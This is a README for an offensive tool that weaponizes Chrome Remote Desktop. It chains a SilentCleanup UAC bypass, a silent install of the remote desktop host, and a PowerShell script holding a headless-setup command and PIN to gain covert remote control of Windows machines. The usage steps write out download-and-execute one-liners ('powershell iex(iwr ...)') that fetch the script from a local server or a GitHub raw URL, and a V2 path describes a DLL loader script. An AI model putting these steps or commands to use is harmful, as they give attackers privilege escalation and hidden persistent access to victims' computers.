# CRDP
Chrome Remote Desktop weaponization Tool(only x64)


## Execution Flow

1. [SilentCleanup_BypassUAC](https://crimsonlabs.io/posts/uac-bypass-via-dll-planting/)
2. Downloading the msi file from the [website](https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi) and installing crdp.
3. Crdp.ps1 with pre-generated commands and pin numbers according to the crdp format is executed.


## How To Use

V1:
1. Create Windows (CMD) on the https://remotedesktop.google.com/headless/ website.
    - The generated command is one-time.
2. Copy and paste the generated command into crdp.ps1 to the $CRDP_CMD variable on line 3.
3. Build the SilentCleanup_BypassUAC project in the code folder and load the script to an address on the web as follows.
    - SilentCleanup_BypassUAC.exe "powershell iex(iwr http://127.0.0.1:80/crdp.ps1)"
    - SilentCleanup_BypassUAC.exe "powershell iex(iwr http://https://raw.githubusercontent.com/veath1/CRDP/main/crdp.ps1)"

V2:
1. Create Windows (CMD) on the https://remotedesktop.google.com/headless/ website.
    - The generated command is one-time.
2. Copy and paste the generated command into crdp.ps1 to the $CRDP_CMD variable on line 3.
3. Build the dll project in the v2 folder and fit it to get it from xloader.ps1 through the website.
    - Also available in bat script format via p2cmd.ps1.

## Reference

  - https://asec.ahnlab.com/ko/54804/
  - https://crimsonlabs.io/posts/uac-bypass-via-dll-planting/
  - https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC
